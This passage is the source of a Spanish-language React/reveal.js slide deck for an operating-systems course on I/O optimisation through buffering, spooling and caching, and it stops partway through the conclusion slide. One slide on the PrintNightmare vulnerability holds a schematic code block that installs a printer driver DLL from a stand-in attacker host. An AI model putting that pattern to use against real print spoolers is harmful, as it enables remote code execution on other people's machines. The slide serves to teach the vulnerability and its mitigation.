import { Deck, Slide, Stack, Code } from "@revealjs/react";
import RevealHighlight from "reveal.js/plugin/highlight";
import React from "react";
import { motion } from "framer-motion";
import {
  Zap,
  Layers,
  RotateCcw,
  ShieldAlert,
  Cpu,
  Database,
  HardDrive,
  Clock,
  ArrowRight,
  Activity,
  Printer,
} from "lucide-react";

import "reveal.js/reveal.css";
import "reveal.js/theme/dracula.css";
import "reveal.js/plugin/highlight/monokai.css";

interface MechanismProps {
  label: string;
  description: string;
  icon?: React.ReactNode;
}

const MechanismCard: React.FC<MechanismProps> = ({
  label,
  description,
  icon,
}) => (
  <motion.div
    initial={{ opacity: 0, y: 20 }}
    whileInView={{ opacity: 1, y: 0 }}
    viewport={{ once: true }}
    style={{
      textAlign: "left",
      background: "rgba(255,255,255,0.03)",
      padding: "1.5rem",
      borderRadius: "12px",
      border: "1px solid rgba(255,255,255,0.05)",
    }}
  >
    <div
      style={{
        display: "flex",
        alignItems: "center",
        gap: "1rem",
        marginBottom: "0.8rem",
      }}
    >
      {icon && <div style={{ color: "var(--accent-buf)" }}>{icon}</div>}
      <span
        style={{
          color: "var(--accent-buf)",
          fontFamily: "var(--mono)",
          fontSize: "1.1rem",
          fontWeight: "700",
        }}
      >
        {label}
      </span>
    </div>
    <p
      style={{
        margin: 0,
        fontSize: "1.4rem !important",
        color: "var(--subtext)",
      }}
    >
      {description}
    </p>
  </motion.div>
);

const AnimatedSVG: React.FC<{
  children: React.ReactNode;
  width?: string | number;
  height?: string | number;
}> = ({ children, width = "100%", height = "auto" }) => (
  <div
    style={{
      width,
      height,
      display: "flex",
      justifyContent: "center",
      alignItems: "center",
    }}
  >
    {children}
  </div>
);

export default function App() {
  return (
    <>
      <style>{`
        :root {
          --bg: #06080f;
          --bg-dark: #06080f;
          --gray1: #1c212c;
          --gray2: #232a36;
          --line: #313342;
          --fg: #f3f6f9;
          --subtext: #A1AABB;
          --muted: #8394A3;
          --accent-buf: #7fb4ca;
          --accent-spool: #deba87;
          --accent-cache: #b7cc85;
          --accent-red: #cb7c94;
          --accent-gold: #e0c15a;
          --mono: 'IBM Plex Mono', monospace;
          --serif: 'Source Serif 4', serif;
        }
        body {
          background-color: var(--bg) !important;
        }
        .reveal {
          background-color: var(--bg) !important;
        }
        .reveal .controls { color: var(--accent-buf) !important; }
        .reveal .progress { height: 6px !important; background: rgba(255,255,255,0.1) !important; }
        .reveal .progress span { background: var(--accent-buf) !important; }
        
        .glass-card {
          background: rgba(28, 33, 44, 0.7) !important;
          backdrop-filter: blur(12px);
          border: 1px solid var(--line);
          border-radius: 24px;
          padding: 3rem;
          box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }

        .presenter-tag {
          font-family: var(--mono);
          font-size: 1.1rem;
          color: var(--accent-gold);
          letter-spacing: 0.15em;
          margin-bottom: 2rem;
          background: rgba(224, 193, 90, 0.1);
          padding: 0.5rem 1.5rem;
          display: inline-block;
          border-radius: 99px;
          border: 1px solid rgba(224, 193, 90, 0.2);
        }
        .technical-note {
          border-left: 4px solid var(--accent-buf);
          background: rgba(127, 180, 202, 0.05);
          padding: 1.5rem;
          margin-top: 1.5rem;
          text-align: left;
          border-radius: 0 12px 12px 0;
        }
        .reveal p, .reveal li, .reveal td {
          font-size: 2.2rem !important;
          line-height: 1.6 !important;
          color: var(--subtext);
        }
        .reveal h1, .reveal h2, .reveal h3, .reveal h4 {
          color: var(--fg) !important;
          text-transform: none !important;
          font-weight: 700 !important;
        }
        .reveal .metric-val {
          font-size: 2.5rem !important;
          font-weight: 800;
          font-family: var(--mono);
        }
        .reveal .metric-label {
          font-size: 1.1rem !important;
          font-family: var(--mono);
          text-transform: uppercase;
          letter-spacing: 0.1em;
          opacity: 0.7;
        }
        .grid-2 {
          display: grid;
          grid-template-columns: 1fr 1fr;
          gap: 3rem;
          align-items: center;
        }
        .metric-card {
          background: var(--gray2);
          padding: 1.5rem;
          border-radius: 16px;
          border: 1px solid var(--line);
        }
        
        /* Barra de desplazamiento personalizada */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--line); border-radius: 4px; }
        
        .reveal .slides section {
          padding: 0 !important;
        }
      `}</style>
      <Deck
        config={{
          hash: true,
          center: true,
          transition: "fade",
          transitionSpeed: "normal",
          width: 1920,
          height: 1080,
          margin: 0.05,
          minScale: 0.2,
          maxScale: 2.0,
          controls: true,
          progress: true,
        }}
        plugins={[RevealHighlight]}
      >
        {/* ── PORTADA ACADÉMICA ── */}
        <Slide>
          <div
            style={{
              height: "100%",
              display: "flex",
              alignItems: "center",
              padding: "0 10%",
            }}
          >
            <motion.div
              initial={{ opacity: 0, x: -50 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.8 }}
              style={{ textAlign: "left", position: "relative", zIndex: 1 }}
            >
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "1rem",
                  marginBottom: "1.5rem",
                }}
              >
                <Cpu size={32} color="var(--accent-buf)" />
                <span
                  style={{
                    fontFamily: "var(--mono)",
                    fontSize: "1.2rem",
                    color: "var(--accent-buf)",
                    letterSpacing: "0.4em",
                  }}
                >
                  SISTEMAS OPERATIVOS
                </span>
              </div>

              <h1
                style={{
                  fontSize: "7.5rem",
                  margin: "0.5rem 0 2rem 0",
                  fontWeight: "900",
                  letterSpacing: "-0.03em",
                  lineHeight: "0.95",
                }}
              >
                Métodos de Optimización
                <br />
                <span style={{ color: "var(--accent-gold)" }}>
                  De Entrada - Salida
                </span>
              </h1>

              <div
                style={{
                  height: "4px",
                  width: "120px",
                  background: "var(--accent-gold)",
                  marginBottom: "3.5rem",
                  borderRadius: "2px",
                }}
              ></div>

              <div className="presenter-tag">ALEX • LAURA • DIEGO</div>

              <p
                style={{
                  fontSize: "2.4rem !important",
                  maxWidth: "900px",
                  lineHeight: "1.4",
                  marginBottom: "4rem",
                  color: "var(--fg)",
                  fontFamily: "var(--serif)",
                  fontWeight: 300,
                }}
              >
                Optimización de throughput mediante{" "}
                <strong>Buffering, Spooling</strong> y <strong>Caching</strong>.
              </p>

              <div
                style={{
                  display: "grid",
                  gridTemplateColumns: "repeat(3, 1fr)",
                  gap: "2rem",
                  width: "100%",
                }}
              >
                <MechanismCard
                  icon={<Layers size={20} />}
                  label="01. BUFFERING"
                  description="Sincronización de flujos asíncronos."
                />
                <MechanismCard
                  icon={<RotateCcw size={20} />}
                  label="02. SPOOLING"
                  description="Virtualización de dispositivos exclusivos."
                />
                <MechanismCard
                  icon={<Activity size={20} />}
                  label="03. CACHING"
                  description="Localidad heurística de datos."
                />
              </div>
            </motion.div>

            <div
              style={{
                position: "absolute",
                top: "10%",
                right: "5%",
                width: "400px",
                height: "400px",
                background: "var(--accent-buf)",
                filter: "blur(150px)",
                opacity: 0.05,
                borderRadius: "50%",
              }}
            ></div>
          </div>
        </Slide>

        {/* ── FUNDAMENTACIÓN CONCEPTUAL ── */}
        <Slide data-transition="zoom">
          <div
            style={{
              height: "100%",
              display: "flex",
              flexDirection: "column",
              justifyContent: "center",
              padding: "0 10%",
            }}
          >
            <div
              style={{
                maxWidth: "1600px",
                margin: "0 auto",
                textAlign: "left",
              }}
            >
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "1.5rem",
                  marginBottom: "2rem",
                }}
              >
                <Database size={40} color="var(--accent-gold)" />
                <span
                  style={{
                    color: "var(--accent-gold)",
                    fontFamily: "var(--mono)",
                    fontSize: "1.2rem",
                    letterSpacing: "0.2em",
                  }}
                >
                  INTRODUCCIÓN TEÓRICA
                </span>
              </div>

              <h2
                style={{
                  fontSize: "5.5rem",
                  marginBottom: "4rem",
                  lineHeight: "1.1",
                }}
              >
                1. Fundamentación Conceptual
              </h2>

              <div
                className="grid-2"
                style={{ gap: "6rem", alignItems: "start" }}
              >
                <div
                  style={{
                    display: "flex",
                    flexDirection: "column",
                    gap: "3rem",
                  }}
                >
                  <p
                    style={{
                      fontSize: "2.4rem !important",
                      lineHeight: "1.6",
                      color: "var(--fg)",
                      fontFamily: "var(--serif)",
                      fontWeight: 300,
                    }}
                  >
                    La gestión de entrada/salida (E/S) constituye uno de los
                    subsistemas críticos en la arquitectura de sistemas
                    operativos contemporáneos. Según{" "}
                    <strong>Holcombe (2023)</strong>, el
                    subsistema de E/S representa la interfaz definitiva
                    entre el núcleo y los dispositivos periféricos.
                  </p>

                  <div
                    className="technical-note"
                    style={{
                      borderColor: "var(--accent-red)",
                      background: "rgba(203, 124, 148, 0.05)",
                    }}
                  >
                    <p style={{ fontSize: "2rem !important", margin: 0 }}>
                      La <strong>"brecha de velocidad"</strong> (speed gap) es
                      el motor arquitectónico que justifica la existencia de
                      estos mecanismos (Univ. de Cambridge, 2022-2023).
                    </p>
                  </div>
                </div>

                <div
                  className="glass-card"
                  style={{
                    padding: "4rem",
                    borderLeft: "8px solid var(--accent-gold)",
                  }}
                >
                  <p
                    style={{
                      fontSize: "2.2rem !important",
                      lineHeight: "1.5",
                      marginBottom: "3rem",
                      fontStyle: "italic",
                    }}
                  >
                    "La optimización de E/S no es meramente una mejora de
                    rendimiento, sino un requisito arquitectónico para la
                    correctitud y eficiencia del sistema operativo."
                  </p>
                  <div
                    style={{
                      borderTop: "1px solid var(--line)",
                      paddingTop: "2rem",
                    }}
                  >
                    <span
                      style={{
                        fontFamily: "var(--mono)",
                        color: "var(--accent-gold)",
                        fontSize: "1.2rem",
                      }}
                    >
                      — Teoría de Jerarquías de Memoria
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </Slide>

        {/* ── TAXONOMÍA DEL GAP DE VELOCIDAD ── */}
        <Slide data-transition="zoom">
          <div style={{ padding: "0 8%" }}>
            <div style={{ textAlign: "left", marginBottom: "4rem" }}>
              <span
                style={{
                  color: "var(--accent-red)",
                  fontFamily: "var(--mono)",
                  fontSize: "1.1rem",
                  letterSpacing: "0.2em",
                }}
              >
                01 · RENDIMIENTO DEL SISTEMA
              </span>
              <h2 style={{ fontSize: "4.5rem", marginTop: "0.5rem" }}>
                El problema de la Latencia
              </h2>
            </div>

            <div className="grid-2">
              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  gap: "1.5rem",
                }}
              >
                {[
                  {
                    label: "Registros CPU / L1",
                    val: "~1 ns",
                    color: "var(--accent-cache)",
                    icon: <Cpu size={24} />,
                    power: "10⁰",
                  },
                  {
                    label: "Memoria Principal DRAM",
                    val: "~100 ns",
                    color: "var(--accent-gold)",
                    icon: <Database size={24} />,
                    power: "10²",
                  },
                  {
                    label: "Almacenamiento NVMe SSD",
                    val: "~100 μs",
                    color: "var(--accent-buf)",
                    icon: <Zap size={24} />,
                    power: "10⁵",
                  },
                  {
                    label: "HDD Legado / Red",
                    val: "~10 ms",
                    color: "var(--accent-red)",
                    icon: <HardDrive size={24} />,
                    power: "10⁷",
                  },
                ].map((item, i) => (
                  <motion.div
                    key={i}
                    initial={{ opacity: 0, x: -30 }}
                    whileInView={{ opacity: 1, x: 0 }}
                    transition={{ delay: i * 0.1 }}
                    className="metric-card"
                    style={{
                      display: "flex",
                      justifyContent: "space-between",
                      alignItems: "center",
                      borderLeft: `4px solid ${item.color}`,
                    }}
                  >
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "1.5rem",
                      }}
                    >
                      <div style={{ color: item.color }}>{item.icon}</div>
                      <div>
                        <div className="metric-label">{item.label}</div>
                        <div
                          className="metric-val"
                          style={{ color: item.color }}
                        >
                          {item.val}
                        </div>
                      </div>
                    </div>
                    <div style={{ textAlign: "right", opacity: 0.4 }}>
                      <div
                        style={{
                          fontSize: "0.7rem",
                          fontFamily: "var(--mono)",
                        }}
                      >
                        MAGNITUD
                      </div>
                      <div style={{ fontSize: "2rem", fontWeight: 800 }}>
                        {item.power}
                      </div>
                    </div>
                  </motion.div>
                ))}
              </div>

              <div className="glass-card" style={{ padding: "3.5rem" }}>
                <div
                  style={{
                    display: "flex",
                    alignItems: "flex-start",
                    gap: "1.5rem",
                  }}
                >
                  <ShieldAlert
                    size={48}
                    color="var(--accent-red)"
                    style={{ flexShrink: 0 }}
                  />
                  <div>
                    <h4 style={{ fontSize: "2.5rem", marginBottom: "1.5rem" }}>
                      Impacto Arquitectónico
                    </h4>
                    <p
                      style={{
                        fontSize: "2.2rem !important",
                        lineHeight: "1.4",
                      }}
                    >
                      Esta disparidad de <strong>7 órdenes de magnitud</strong>{" "}
                      implica que la CPU pasa el 99.9% de sus ciclos en{" "}
                      <code>I/O WAIT</code> sin capas de abstracción.
                    </p>
                    <div
                      style={{
                        marginTop: "2.5rem",
                        display: "flex",
                        flexDirection: "column",
                        gap: "1rem",
                      }}
                    >
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: "1rem",
                          color: "var(--accent-gold)",
                        }}
                      >
                        <ArrowRight size={20} />
                        <span
                          style={{
                            fontSize: "1.8rem",
                            fontFamily: "var(--mono)",
                          }}
                        >
                          Desacoplamiento Productor-Consumidor
                        </span>
                      </div>
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: "1rem",
                          color: "var(--accent-gold)",
                        }}
                      >
                        <ArrowRight size={20} />
                        <span
                          style={{
                            fontSize: "1.8rem",
                            fontFamily: "var(--mono)",
                          }}
                        >
                          Independencia de Dispositivo (VFS)
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </Slide>

        {/* ── BUFFERING ── */}
        <Stack>
          <Slide data-transition="zoom">
            <div style={{ padding: "0 8%" }}>
              <div
                className="glass-card"
                style={{ borderLeft: "12px solid var(--accent-buf)" }}
              >
                <div
                  style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    marginBottom: "3rem",
                  }}
                >
                  <div>
                    <span
                      className="presenter-tag"
                      style={{
                        background: "rgba(127, 180, 202, 0.1)",
                        color: "var(--accent-buf)",
                      }}
                    >
                      MECANISMO 01 // BUFFERING
                    </span>
                    <h2 style={{ fontSize: "5rem", marginTop: "0.5rem" }}>
                      Acoplamiento de Velocidades
                    </h2>
                  </div>
                  <Layers
                    size={80}
                    color="var(--accent-buf)"
                    style={{ opacity: 0.2 }}
                  />
                </div>

                <div className="grid-2" style={{ gap: "4rem" }}>
                  <div style={{ textAlign: "left" }}>
                    <h4
                      style={{
                        color: "var(--accent-buf)",
                        fontSize: "2.5rem",
                        marginBottom: "2rem",
                      }}
                    >
                      Tres Razones Fundamentales (Cambridge, 2023):
                    </h4>
                    <ul
                      style={{
                        display: "flex",
                        flexDirection: "column",
                        gap: "1.5rem",
                      }}
                    >
                      <li>
                        <strong>Discrepancia de Velocidad:</strong> Sincroniza
                        productor y consumidor.
                      </li>
                      <li>
                        <strong>Adaptación de Tamaño:</strong> Gestiona distintos
                        bloques de transferencia.
                      </li>
                      <li>
                        <strong>Semántica de Copia:</strong> Protege la
                        integridad de E/S de aplicaciones.
                      </li>
                    </ul>
                  </div>
                  <div
                    className="metric-card"
                    style={{ background: "rgba(255,255,255,0.02)" }}
                  >
                    <p
                      style={{
                        fontSize: "2rem !important",
                        fontStyle: "italic",
                        borderLeft: "4px solid var(--accent-gold)",
                        paddingLeft: "1.5rem",
                      }}
                    >
                      "Región de almacenamiento temporal en RAM para absorber
                      diferencias de velocidad sin bloqueos mutuos."
                    </p>
                    <div
                      style={{
                        marginTop: "2rem",
                        display: "flex",
                        gap: "1rem",
                        opacity: 0.6,
                      }}
                    >
                      <span className="presenter-tag" style={{ fontSize: "0.8rem" }}>
                        VOLÁTIL
                      </span>
                      <span className="presenter-tag" style={{ fontSize: "0.8rem" }}>
                        NANOSEGUNDOS
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </Slide>

          <Slide data-transition="convex-in concave-out">
            <div style={{ padding: "0 10%" }}>
              <div style={{ textAlign: "left", marginBottom: "4rem" }}>
                <span
                  style={{
                    color: "var(--accent-gold)",
                    fontFamily: "var(--mono)",
                    fontSize: "1.1rem",
                  }}
                >
                  E/S DE NUEVA GENERACIÓN
                </span>
                <h2 style={{ fontSize: "4.5rem" }}>Evolución: io_uring</h2>
                <p style={{ fontSize: "2.2rem", color: "var(--accent-buf)" }}>
                  Eficiencia Asíncrona con Cero Syscalls
                </p>
              </div>
              <div className="grid-2" style={{ marginTop: "3rem" }}>
                <div className="technical-note">
                  <h4 style={{ marginBottom: "1rem" }}>
                    Submission Queue (SQ)
                  </h4>
                  <p style={{ fontSize: "1.8rem !important" }}>
                    Las apps envían descriptores a anillos mapeados en memoria.{" "}
                    <strong>Sin cambios de contexto.</strong>
                  </p>
                </div>
                <div
                  className="technical-note"
                  style={{ borderColor: "var(--accent-gold)" }}
                >
                  <h4 style={{ marginBottom: "1rem" }}>
                    Completion Queue (CQ)
                  </h4>
                  <p style={{ fontSize: "1.8rem !important" }}>
                    El Kernel notifica resultados asíncronamente.{" "}
                    <strong>Procesamiento por lotes</strong> extremo.
                  </p>
                </div>
              </div>
            </div>
          </Slide>
        </Stack>

        {/* ── SPOOLING ── */}
        <Stack>
          <Slide data-transition="zoom">
            <div style={{ padding: "0 8%" }}>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "2rem",
                  marginBottom: "3rem",
                }}
              >
                <RotateCcw size={60} color="var(--accent-spool)" />
                <h2 style={{ fontSize: "5rem", margin: 0 }}>
                  Desacoplamiento Arquitectónico
                </h2>
              </div>

              <div className="grid-2" style={{ gap: "4rem" }}>
                <div className="glass-card" style={{ textAlign: "left" }}>
                  <h3 style={{ color: "var(--accent-spool)", fontSize: "2.5rem" }}>
                    Spooling vs Buffering
                  </h3>
                  <p
                    style={{ fontSize: "2.2rem !important", marginTop: "1.5rem" }}
                  >
                    A diferencia del buffer, el <strong>Spooling</strong> utiliza
                    el disco como un buffer masivo para gestionar{" "}
                    <strong>trabajos completos</strong> destinados a dispositivos
                    exclusivos.
                  </p>
                  <div
                    className="technical-note"
                    style={{
                      borderColor: "var(--accent-spool)",
                      background: "rgba(222, 186, 135, 0.05)",
                    }}
                  >
                    <strong>Persistencia:</strong> Sobrevive a fallos de energía
                    (Acceso en ms).
                  </div>
                </div>

                <div
                  style={{ display: "flex", flexDirection: "column", gap: "1.5rem" }}
                >
                  <div className="metric-card">
                    <span className="metric-label">
                      Componentes (Microsoft Learn)
                    </span>
                    <div
                      style={{
                        marginTop: "1rem",
                        display: "flex",
                        flexDirection: "column",
                        gap: "0.5rem",
                      }}
                    >
                      <li style={{ fontSize: "1.8rem !important" }}>
                        <code>spoolsv.exe</code> (Gestión de Colas)
                      </li>
                      <li style={{ fontSize: "1.8rem !important" }}>
                        Procesador de Impresión (Conversión)
                      </li>
                      <li style={{ fontSize: "1.8rem !important" }}>
                        Interfaz de Control (Administración)
                      </li>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </Slide>
        </Stack>

        {/* ── MATRIZ COMPARATIVA ── */}
        <Slide 
          data-background-iframe="./comparativa.html" 
          data-background-interactive
          data-transition="fade"
        >
        </Slide>

        {/* ── ESCENARIOS DE APLICACIÓN ── */}
        <Slide data-transition="convex">
          <div style={{ padding: "0 8%" }}>
            <div style={{ textAlign: "left", marginBottom: "4rem" }}>
              <span
                style={{
                  color: "var(--accent-gold)",
                  fontFamily: "var(--mono)",
                  fontSize: "1.1rem",
                  letterSpacing: "0.2em",
                }}
              >
                EL MUNDO REAL
              </span>
              <h2 style={{ fontSize: "5rem", margin: 0 }}>
                Escenarios de Aplicación
              </h2>
            </div>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "3rem" }}>
              <div className="glass-card" style={{ padding: "2.5rem", borderTop: "6px solid var(--accent-buf)", display: "flex", flexDirection: "column" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "1rem", marginBottom: "1.5rem" }}>
                  <Zap size={30} color="var(--accent-buf)" />
                  <h3 style={{ fontSize: "2rem", margin: 0, color: "var(--accent-buf)" }}>Buffering</h3>
                </div>
                <ul style={{ display: "flex", flexDirection: "column", gap: "1rem", fontSize: "1.6rem !important", textAlign: "left", margin: 0, paddingLeft: "1.5rem" }}>
                  <li><strong>Streaming Multimedia:</strong> Precarga en RAM para compensar jitter (QoS).</li>
                  <li><strong>Redes (DCTCP):</strong> Gestión de colas activas y notificación de congestión (ECN) en switches de Datacenters.</li>
                </ul>
              </div>

              <div className="glass-card" style={{ padding: "2.5rem", borderTop: "6px solid var(--accent-spool)", display: "flex", flexDirection: "column" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "1rem", marginBottom: "1.5rem" }}>
                  <RotateCcw size={30} color="var(--accent-spool)" />
                  <h3 style={{ fontSize: "2rem", margin: 0, color: "var(--accent-spool)" }}>Spooling</h3>
                </div>
                <ul style={{ display: "flex", flexDirection: "column", gap: "1rem", fontSize: "1.6rem !important", textAlign: "left", margin: 0, paddingLeft: "1.5rem" }}>
                  <li><strong>Impresión:</strong> Interceptación de salida a disco para serializar trabajos en dispositivos exclusivos.</li>
                  <li><strong>Procesamiento por Lotes:</strong> Gestión de colas masivas asíncronas sin bloquear procesos generadores.</li>
                </ul>
              </div>

              <div className="glass-card" style={{ padding: "2.5rem", borderTop: "6px solid var(--accent-cache)", display: "flex", flexDirection: "column" }}>
                <div style={{ display: "flex", alignItems: "center", gap: "1rem", marginBottom: "1.5rem" }}>
                  <Activity size={30} color="var(--accent-cache)" />
                  <h3 style={{ fontSize: "2rem", margin: 0, color: "var(--accent-cache)" }}>Caching</h3>
                </div>
                <ul style={{ display: "flex", flexDirection: "column", gap: "1rem", fontSize: "1.6rem !important", textAlign: "left", margin: 0, paddingLeft: "1.5rem" }}>
                  <li><strong>Sistemas de Archivos:</strong> Buffer caché en ext4/Btrfs (LRU adaptativo).</li>
                  <li><strong>Almacenamiento NVMe:</strong> Reingeniería del I/O bufferizado al migrar cuellos de botella de hardware al Kernel.</li>
                </ul>
              </div>
            </div>
          </div>
        </Slide>

        {/* ── CASO CRÍTICO: SPOOLING ── */}
        <Stack>
          <Slide data-transition="zoom">
            <div style={{ padding: "0 8%", textAlign: "left" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "2rem", marginBottom: "3rem" }}>
                <RotateCcw size={50} color="var(--accent-spool)" />
                <h2 style={{ fontSize: "4.5rem", margin: 0 }}>Análisis Crítico: Spooling</h2>
              </div>
              <div className="grid-2">
                <div style={{ display: "flex", flexDirection: "column", gap: "2rem" }}>
                  <div className="metric-card" style={{ borderLeft: "4px solid var(--accent-spool)" }}>
                    <h4 style={{ fontSize: "1.8rem", color: "var(--fg)", marginBottom: "0.5rem" }}>1. Exclusividad y Serialización</h4>
                    <p style={{ fontSize: "1.5rem !important", margin: 0, opacity: 0.8 }}>Almacena trabajos completos en disco y los entrega secuencialmente (FIFO), garantizando procesamiento atómico sin intercalar páginas.</p>
                  </div>
                  <div className="metric-card" style={{ borderLeft: "4px solid var(--accent-buf)" }}>
                    <h4 style={{ fontSize: "1.8rem", color: "var(--fg)", marginBottom: "0.5rem" }}>2. Multiprogramación Real</h4>
                    <p style={{ fontSize: "1.5rem !important", margin: 0, opacity: 0.8 }}>Libera el proceso usuario inmediatamente. El spooler opera como un servicio de sistema independiente (segundo plano).</p>
                  </div>
                  <div className="metric-card" style={{ borderLeft: "4px solid var(--accent-cache)" }}>
                    <h4 style={{ fontSize: "1.8rem", color: "var(--fg)", marginBottom: "0.5rem" }}>3. Tolerancia a Fallos</h4>
                    <p style={{ fontSize: "1.5rem !important", margin: 0, opacity: 0.8 }}>Los datos residen en disco no volátil. Permite reanudar impresiones tras un corte de energía (a diferencia del buffering).</p>
                  </div>
                </div>
                <div className="glass-card" style={{ padding: "3rem" }}>
                  <h4 style={{ fontSize: "2.2rem", color: "var(--accent-gold)", marginBottom: "1.5rem" }}>Abstracción de Formatos</h4>
                  <p style={{ fontSize: "1.8rem !important", lineHeight: 1.5 }}>El motor GDI realiza spooling de instrucciones como archivos EMF, procesados por drivers específicos (PCL, PostScript).</p>
                  <div className="technical-note" style={{ marginTop: "2rem" }}>
                    <strong style={{ color: "var(--accent-buf)" }}>Ruta XPS Moderna:</strong> Pasa archivos directamente al dispositivo, eliminando conversiones intermedias y reduciendo latencia.
                  </div>
                </div>
              </div>
            </div>
          </Slide>

          <Slide data-transition="slide-in fade-out">
            <div
              style={{
                padding: "0 5%",
                height: "100%",
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
              }}
            >
            <div
              className="grid-2"
              style={{
                gap: "6rem", // Reducido de 10rem a 6rem para evitar el desplazamiento excesivo a la derecha
                alignItems: "center",
                maxWidth: "1800px", // Ancho máximo para mantenerlo centrado
                margin: "0 auto", // Centra el contenedor de la grilla en la diapositiva
              }}
            >
              {/* Columna Izquierda: Teoría */}
              <div
                style={{
                  textAlign: "left",
                  display: "flex",
                  flexDirection: "column",
                  gap: "2.5rem",
                  width: "100%", // Asegura que ocupe su espacio en la grilla
                }}
              >
                <div>
                  <span
                    className="presenter-tag"
                    style={{
                      background: "rgba(203, 124, 148, 0.1)",
                      color: "var(--accent-red)",
                      borderColor: "rgba(203, 124, 148, 0.3)",
                      marginBottom: "1.5rem",
                    }}
                  >
                    AUDITORÍA // CVE-2021-34527
                  </span>
                  <h2
                    style={{
                      fontSize: "6rem",
                      margin: 0,
                      lineHeight: "1",
                      letterSpacing: "-0.02em",
                    }}
                  >
                    PrintNightmare
                  </h2>
                </div>

                <div
                  className="glass-card"
                  style={{
                    borderColor: "rgba(203, 124, 148, 0.3)",
                    padding: "3.5rem",
                    position: "relative",
                    overflow: "hidden",
                  }}
                >
                  <div
                    style={{
                      position: "absolute",
                      top: "-20px",
                      right: "-20px",
                      opacity: 0.05,
                      pointerEvents: "none",
                    }}
                  >
                    <ShieldAlert size={250} color="var(--accent-red)" />
                  </div>
                  <p
                    style={{
                      fontSize: "2.5rem !important",
                      color: "var(--fg)",
                      lineHeight: "1.4",
                      margin: 0,
                      position: "relative",
                      zIndex: 1,
                    }}
                  >
                    Los servicios de Spooler legados permitieron la{" "}
                    <strong>Ejecución Remota de Código</strong> mediante la
                    inyección de DLLs arbitrarias. Según Walters (2025), la postura de seguridad ha mejorado eliminando ejecuciones remotas de código.
                  </p>
                  <div style={{ marginTop: "2rem", display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1rem" }}>
                    <div className="metric-card" style={{ textAlign: "center" }}>
                      <div className="metric-val" style={{ color: "var(--accent-red)" }}>35</div>
                      <div className="metric-label">Vulnerabilidades en 2022</div>
                    </div>
                    <div className="metric-card" style={{ textAlign: "center" }}>
                      <div className="metric-val" style={{ color: "var(--accent-cache)" }}>0</div>
                      <div className="metric-label">RCEs desde 2021</div>
                    </div>
                  </div>
                </div>

                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "1.5rem",
                    color: "var(--accent-red)",
                    background: "rgba(203, 124, 148, 0.1)",
                    padding: "2rem",
                    borderRadius: "20px",
                    border: "1px solid rgba(203, 124, 148, 0.2)",
                  }}
                >
                  <ShieldAlert size={40} />
                  <span
                    style={{
                      fontWeight: 800,
                      fontSize: "2rem",
                      letterSpacing: "0.05em",
                    }}
                  >
                    FALLO CRÍTICO DE ARQUITECTURA
                  </span>
                </div>
              </div>

              {/* Columna Derecha: Código y Mitigación */}
              <div
                style={{
                  display: "flex",
                  flexDirection: "column",
                  gap: "3rem",
                  width: "100%",
                }}
              >
                <div
                  style={{
                    borderRadius: "24px",
                    overflow: "hidden",
                    boxShadow: "0 50px 100px rgba(0,0,0,0.7)",
                    border: "1px solid var(--line)",
                  }}
                >
                  <Code
                    language="javascript"
                    lineNumbers="1|3-5|7"
                    style={{
                      fontSize: "1.7rem",
                      padding: "2.5rem",
                      margin: 0,
                    }}
                  >
                    {`// Ataque RpcAddPrinterDriverEx
const evilDLL = "\\\\\\\\attacker\\\\exploit.dll";

// Inyección en el Spooler persistente
installDriver(evilDLL); 

// Resultado: Compromiso Total`}
                  </Code>
                </div>

                <motion.div
                  initial={{ opacity: 0, scale: 0.95 }}
                  whileInView={{ opacity: 1, scale: 1 }}
                  className="technical-note"
                  style={{
                    margin: 0,
                    borderColor: "var(--accent-red)",
                    background: "rgba(255, 255, 255, 0.03)",
                    padding: "2.5rem",
                    borderRadius: "24px",
                    borderLeftWidth: "12px",
                  }}
                >
                  <h4
                    style={{
                      fontSize: "2.2rem !important",
                      color: "var(--fg)",
                      marginBottom: "1rem",
                      display: "flex",
                      alignItems: "center",
                      gap: "1rem",
                    }}
                  >
                    <ArrowRight color="var(--accent-red)" /> Mitigación
                  </h4>
                  <p
                    style={{
                      fontSize: "2rem !important",
                      margin: 0,
                      lineHeight: "1.4",
                    }}
                  >
                    Aislamiento de procesos y <strong>Sandboxing</strong> de
                    colas de impresión.
                  </p>
                </motion.div>
              </div>
            </div>
          </div>
        </Slide>

        {/* ── CONCLUSIÓN ── */}
        <Slide>
          <div
            style={{
              height: "100%",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              whileInView={{ scale: 1, opacity: 1 }}
              className="glass-card"
              style={{
                maxWidth: "1200px",
                textAlign: "center",
                padding: "5rem",
              }}
            >
              <h2 style={{ fontSize: "6rem", marginBottom: "3rem" }}>
                Conclusión Técnica
              </h2>
              <p
                style={{
                  fontSize: "3rem !important",
                  lineHeight: "1.3",
                  color: "var(--fg)",
                  marginBottom: "4rem",
                }}
              >
                La eficiencia de los sistemas operativos modernos no reside solo
                en la velocidad del hardware, sino en la{" "}
                <strong>inteligencia arquitectónica</strong> de la gestión de
                latencia.
              </p>

              <div
                style={{
                  display: "flex",
                  justifyContent: "center",
                  gap: "4rem",
                }}
              >
